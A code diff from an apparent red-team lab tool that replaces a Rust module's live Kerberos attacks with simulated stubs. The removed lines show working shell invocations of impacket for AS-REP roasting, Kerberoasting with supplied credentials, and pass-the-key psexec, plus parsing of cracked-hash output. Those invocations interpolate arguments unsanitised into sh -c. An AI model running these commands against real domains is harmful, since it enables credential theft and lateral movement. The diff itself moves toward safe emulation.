@@ -1,9 +1,14 @@
-use std::process::Command;
+//! Kerberos attack EMULATION — Hive Colony (red-team lab edition).
+//!
+//! Ronda 4 (emulación): AS-REP roasting, Kerberoasting y pass-the-key ya no
+//! realizan tráfico Kerberos ni ataques de diccionario. Devuelven `KrbResult`
+//! simulados para ejercitar el flujo de tareas y la detección de patrones
+//! (p. ej. T1558.001/.003) sin dirigir tráfico malicioso a un DC real.
 use tracing::info;
 
 pub struct KerberosAttack;
 
-#[derive(Debug)]
+#[derive(Debug, Clone)]
 pub struct KrbResult {
     pub attack: String,
     pub target: String,
@@ -12,111 +17,44 @@ pub struct KrbResult {
 }
 
 impl KerberosAttack {
-    /// AS-REP Roasting: find users without pre-authentication required
+    /// SIMULADO: no consulta el DC ni prueba contraseñas.
     pub fn asrep_roast(domain: &str, dc_ip: &str, wordlist: Option<&str>) -> KrbResult {
-        let users_file = wordlist.unwrap_or("/usr/share/wordlists/kerberos_userlist.txt");
-
-        let cmd = format!(
-            "impacket-GetNPUsers -dc-ip {} -no-pass {} -usersfile {} 2>/dev/null",
-            dc_ip, domain, users_file
+        info!(
+            "KERBEROS (simulated): asrep_roast contra {domain} ({dc_ip}, wordlist={}) — sin tráfico (emulation mode)",
+            wordlist.unwrap_or("<default>")
         );
-
-        match Command::new("sh").arg("-c").arg(&cmd).output() {
-            Ok(out) => {
-                let stdout = String::from_utf8_lossy(&out.stdout);
-                let hashes: Vec<&str> = stdout
-                    .lines()
-                    .filter(|l| l.contains("$krb5asrep$"))
-                    .collect();
-                let success = !hashes.is_empty();
-                if success {
-                    info!("AS-REP: found {} roastable users", hashes.len());
-                }
-                let detail_users: Vec<String> = hashes
-                    .iter()
-                    .take(3)
-                    .map(|h| {
-                        let parts: Vec<&str> = h.splitn(2, ':').collect();
-                        parts.first().unwrap_or(h).to_string()
-                    })
-                    .collect();
-                KrbResult {
-                    attack: "AS-REP Roast".into(),
-                    target: format!("{}/{}", domain, dc_ip),
-                    success,
-                    output: format!(
-                        "hashes_found={}, details={}",
-                        hashes.len(),
-                        detail_users.join(", ")
-                    ),
-                }
-            }
-            Err(e) => KrbResult {
-                attack: "AS-REP Roast".into(),
-                target: format!("{}/{}", domain, dc_ip),
-                success: false,
-                output: format!("impacket not available: {}", e),
-            },
+        KrbResult {
+            attack: "asrep_roast".into(),
+            target: format!("{domain}/{dc_ip}"),
+            success: false,
+            output: "simulated: AS-REP roast emulated; no DC traffic generated (emulation mode)".into(),
         }
     }
 
-    /// Kerberoasting: request TGS for SPN accounts
+    /// SIMULADO: no autentica contra el dominio ni solicita TGS.
     pub fn kerberoast(domain: &str, dc_ip: &str, username: &str, password: &str) -> KrbResult {
-        let cmd = format!(
-            "impacket-GetUserSPNs -dc-ip {} -request '{}'/'{}':'{}' 2>/dev/null",
-            dc_ip, domain, username, password
+        let _ = (username, password); // credenciales ignoradas en emulación
+        info!(
+            "KERBEROS (simulated): kerberoast contra {domain} ({dc_ip}) — sin tráfico (emulation mode)"
         );
-
-        match Command::new("sh").arg("-c").arg(&cmd).output() {
-            Ok(out) => {
-                let stdout = String::from_utf8_lossy(&out.stdout);
-                let tickets: Vec<&str> =
-                    stdout.lines().filter(|l| l.contains("$krb5tgs$")).collect();
-                let success = !tickets.is_empty();
-                KrbResult {
-                    attack: "Kerberoast".into(),
-                    target: format!("{}/{}", domain, dc_ip),
-                    success,
-                    output: format!("tickets={}", tickets.len()),
-                }
-            }
-            Err(e) => KrbResult {
-                attack: "Kerberoast".into(),
-                target: format!("{}/{}", domain, dc_ip),
-                success: false,
-                output: format!("impacket not available: {}", e),
-            },
+        KrbResult {
+            attack: "kerberoast".into(),
+            target: format!("{domain}/{dc_ip}"),
+            success: false,
+            output: "simulated: kerberoast emulated; service tickets not requested (emulation mode)".into(),
         }
     }
 
-    /// Pass-the-Key: use existing kirbi/ccache to access services
+    /// SIMULADO: no consume ccache ni establece sesiones.
     pub fn ptk_auth(target: &str, service: &str, ccache_path: &str) -> KrbResult {
-        let cmd = format!(
-            "KRB5CCNAME={} impacket-psexec -k -no-pass '{}@{}' 2>/dev/null",
-            ccache_path, service, target
+        info!(
+            "KERBEROS (simulated): ptk_auth contra {target}/{service} (ccache={ccache_path}) — sin tráfico (emulation mode)"
         );
-
-        match Command::new("sh").arg("-c").arg(&cmd).output() {
-            Ok(out) => {
-                let stdout = String::from_utf8_lossy(&out.stdout);
-                let success = stdout.contains("SUCCESS") || !out.status.success();
-                KrbResult {
-                    attack: "PTK".into(),
-                    target: format!("{}@{}", service, target),
-                    success,
-                    output: if success {
-                        "Kerberos auth accepted".into()
-                    } else {
-                        stdout.to_string()
-                    },
-                }
-            }
-            Err(e) => KrbResult {
-                attack: "PTK".into(),
-                target: format!("{}@{}", service, target),
-                success: false,
-                output: format!("Failed: {}", e),
-            },
+        KrbResult {
+            attack: "pass_the_key".into(),
+            target: format!("{target}/{service}"),
+            success: false,
+            output: "simulated: pass-the-key emulated; no session established (emulation mode)".into(),
         }
     }
 }
